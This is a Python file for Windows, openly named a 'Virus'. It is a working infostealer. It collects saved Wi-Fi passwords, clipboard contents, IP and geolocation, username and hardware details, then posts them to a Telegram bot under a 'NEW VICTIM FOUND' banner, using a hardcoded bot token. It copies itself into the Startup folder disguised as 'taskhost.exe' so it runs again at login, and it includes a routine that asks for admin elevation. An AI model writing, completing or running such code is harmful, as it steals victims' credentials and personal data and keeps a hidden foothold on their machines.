import os
import shutil
import sys
import ctypes
import requests
import socket
import platform
import psutil
import pyperclip
import wmi
import time
from datetime import datetime
import locale

class SystemInfoCollector:

    @staticmethod
    def get_ip():
        return requests.get("https://api.ipify.org").text

    @staticmethod
    def get_clipboard():
        try:
            return pyperclip.paste()
        except:
            return "Could not access clipboard"

    @staticmethod
    def get_mac_address():
        for line in os.popen("ipconfig /all").read().splitlines():
            if "Physical Address" in line:
                return line.split(":")[1].strip()
        return "N/A"

    @staticmethod
    def get_wifi_details():
        try:
            profiles = os.popen("netsh wlan show profiles").read().splitlines()
            wifi_names = [line.split(":")[1].strip() for line in profiles if "All User Profile" in line]
            wifi_info = ""
            for wifi in wifi_names:
                details = os.popen(f'netsh wlan show profile "{wifi}" key=clear').read()
                wifi_info += f"\n{wifi}: {details.split('Key Content')[1].splitlines()[0].split(':')[1].strip()}" if 'Key Content' in details else f"\n{wifi}: [No Password Found]"
            return wifi_info
        except:
            return "No Wi-Fi info available"

    @staticmethod
    def get_extras():
        try:
            global wifi_passwords
            global wifi_list
            global wifi_details
            if os.name == 'nt':
                wifi_passwords = os.popen("netsh wlan show profiles").read().splitlines()
                wifi_list = [line.split(":")[1][1:] for line in wifi_passwords if "All User Profile" in line]
    
                for wifi in wifi_list:
                    wifi_details = os.popen(f'netsh wlan show profile "{wifi}" key=clear').read()

            else:
                pass
            screen_res = os.popen('wmic desktopmonitor get screenheight, screenwidth').read().splitlines()
            resolution = [line.strip() for line in screen_res if line.strip() and "Screen" not in line]
            resolution_str = resolution[0].replace(" ", "x") if resolution else "Unknown"

            boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            uptime_sec = time.time() - psutil.boot_time()
            uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_sec))

            try:
                browser = os.popen("reg query HKEY_CLASSES_ROOT\\http\\shell\\open\\command").read().split('"')[1]
            except:
                browser = "Unknown"

            win_edition = platform.win32_edition() if hasattr(platform, "win32_edition") else "Unknown"
            win_version = f"{platform.platform()}"
            timezone = time.tzname[0]
            userprofile = os.environ.get("USERPROFILE")

            lang = locale.getlocale()[0] if locale.getlocale()[0] else "Unknown"

            return {
                "screen_res": resolution_str,
                "boot_time": boot_time,
                "uptime": uptime_str,
                "processes": len(psutil.pids()),
                "browser": browser,
                "win_version": win_version,
                "timezone": timezone,
                "public_profile": userprofile,
                "lang": lang,
                "edition": win_edition
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def get_system_info():
        w = wmi.WMI()
        try:
            system = w.Win32_ComputerSystem()[0]
            gpu = w.Win32_VideoController()[0]
            battery = psutil.sensors_battery()
            ipinfo = requests.get("https://ipinfo.io/json").json()
        except:
            return None

        return {
            "pc_name": socket.gethostname(),
            "username": os.getenv("USERNAME"),
            "os": f"{platform.system()} {platform.release()}",
            "cpu": {
                "name": platform.processor(),
                "architecture": platform.architecture()[0],
                "cores": psutil.cpu_count(logical=True),
                "max_freq": psutil.cpu_freq().max,
                "current_freq": psutil.cpu_freq().current,
            },
            "gpu": {
                "name": gpu.Name,
                "driver": gpu.DriverVersion,
                "vram": f"{int(gpu.AdapterRAM) / (1024**3):.2f} GB"
            },
            "system": {
                "manufacturer": system.Manufacturer,
                "model": system.Model
            },
            "battery": {
                "percent": battery.percent if battery else "N/A",
                "plugged_in": "Yes" if battery and battery.power_plugged else "No"
            },
            "location": ipinfo,
            "extra": SystemInfoCollector.get_extras()
        }


class Virus:

    @staticmethod
    def send_to_telegram():
        try:
            info = SystemInfoCollector.get_system_info()
            if not info:
                return

            extra = info["extra"]

            message = f"""
😈 NEW VICTIM FOUND! 😈
--------------------------------------------------
IP Address: {SystemInfoCollector.get_ip()}
PC Name: {info['pc_name']}
Username: {info['username']}
OS: {info['os']}
Clipboard: {SystemInfoCollector.get_clipboard()}
MAC Address: {SystemInfoCollector.get_mac_address()}


📍 Location Info:
City: {info['location']['city']}
Region: {info['location']['region']}
Country: {info['location']['country']}

🧠 CPU Info:
Name: {info['cpu']['name']}
Architecture: {info['cpu']['architecture']}
Cores: {info['cpu']['cores']}
Max Frequency: {info['cpu']['max_freq']} MHz
Current Frequency: {info['cpu']['current_freq']} MHz

🎮 GPU Info:
Name: {info['gpu']['name']}
Driver: {info['gpu']['driver']}
VRAM: {info['gpu']['vram']}

💻 System Info:
Manufacturer: {info['system']['manufacturer']}
Model: {info['system']['model']}

🔋 Battery Info:
Percent: {info['battery']['percent']}%
Plugged In: {info['battery']['plugged_in']}

📶 WiFi Info:
{SystemInfoCollector.get_wifi_details()}

🧪 Surprise Extras:
Screen Resolution: {extra['screen_res']}
Boot Time: {extra['boot_time']}
Uptime: {extra['uptime']}
Running Processes: {extra['processes']}
Default Browser: {extra['browser']}
Windows Version: {extra['win_version']}
Windows Edition: {extra['edition']}
Time Zone: {extra['timezone']}
Profile Path: {extra['public_profile']}
System Language: {extra['lang']}

📶 Extra WiFi Info:
{wifi_details}

{wifi_list}

--------------------------------------------------
"""
            bot_token = "6473716878:AAGWmbUHN8exetA4KoDkWkVCKLHRUqDkaFA"
            chat_id = "5310710178"
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message}
            requests.post(url, json=payload)

        except Exception as e:
            print(f"Error sending to Telegram: {e}")

    @staticmethod
    def add_to_startup():
        try:
            script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
            dest = os.path.join(startup, os.path.basename(script_path))
            if not os.path.exists(dest):
                shutil.copy(script_path, dest)
        except Exception as e:
            print(f"Startup error: {e}")

    @staticmethod
    def request_admin():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                sys.exit()
        except Exception as e:
            print(f"Admin request error: {e}")

    @staticmethod
    def copy_and_rename():
        try:
            script_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            destination_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
            new_name = 'taskhost.exe'
            destination = os.path.join(destination_folder, new_name)
            if not os.path.exists(destination):
                shutil.copy(script_path, destination)
        except Exception as e:
            print(f"Copy error: {e}")


def main():
    Virus.copy_and_rename()
    Virus.send_to_telegram()

main()
